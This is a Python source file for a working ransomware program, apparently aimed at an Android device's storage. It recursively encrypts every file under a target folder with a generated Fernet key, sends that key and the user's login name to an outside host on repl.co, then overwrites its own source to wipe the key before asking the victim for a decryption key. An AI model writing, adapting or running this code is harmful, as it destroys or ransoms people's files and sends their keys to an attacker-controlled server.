import os
try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install Rust cryptography")
import sys
try:
    import requests
except:
    os.system('pip install requests')

dirr = "/storage/emulated/0/ransomeware"
files = []
key = Fernet.generate_key()

def scanRecurse(base_dir):
	for entry in os.scandir(base_dir):
		if entry.is_file():
			yield entry
		else:
			yield from scanRecurse(entry.path)

for i in scanRecurse(dirr):
			if sys.argv[0] in i.path:
				continue
			files.append(i.path)

class Ransomeware:
	def init(self):
		pass

	def destroy_code(self, file_name, line_num, text):
 	   lines = open(file_name, 'r').readlines()
 	   lines[line_num] = text
 	   out = open(file_name, 'w')
 	   out.writelines(lines)
 	   out.close()
		
	def _generate_key(self):
		json = {}
		json['key'] = key.decode('UTF-8')
		json['whoami'] = os.getlogin()
		res = requests.post("https://u0a270.repl.co/r", json=json)
		try:
			res.json()
		except:
			res.text
		self.destroy_code(sys.argv[0], 7, "key = None\n")

	def decrypt(self):
		
		
		key1 = input("Enter your decryption key: \n")
		for file in files:
			with open(file, 'rb') as file_data:
				data = file_data.read()
				decrypted_data = Fernet(key1.encode('UTF-8')).decrypt(data)
				with open(file,'wb') as file_data:
					file_data.write(decrypted_data)

	def encrypt(self):
		
		self._generate_key()
		for file in files:
			with open(file, 'rb') as file_data:
				data = file_data.read()
			encrypted_data = Fernet(key).encrypt(data)
			with open(file,'wb') as file_data:
				file_data.write(encrypted_data)
	
	

if __name__ == "__main__":
		ransomware = Ransomeware()
		try:
			ransomware.encrypt()
			ransomware.destroy_code(sys.argv[0], 55, '\t\t"""\n')
			ransomware.destroy_code(sys.argv[0], 62, '\t"""\n')
			ransomware.destroy_code(sys.argv[0], 63, '\tpass\n')
			ransomware.decrypt()
		except:
			print("Sorry, an exception occurred.!")
#			ransomeware.encrypt(path_to_folder=dirr)
#			ransomeware.decrypt()
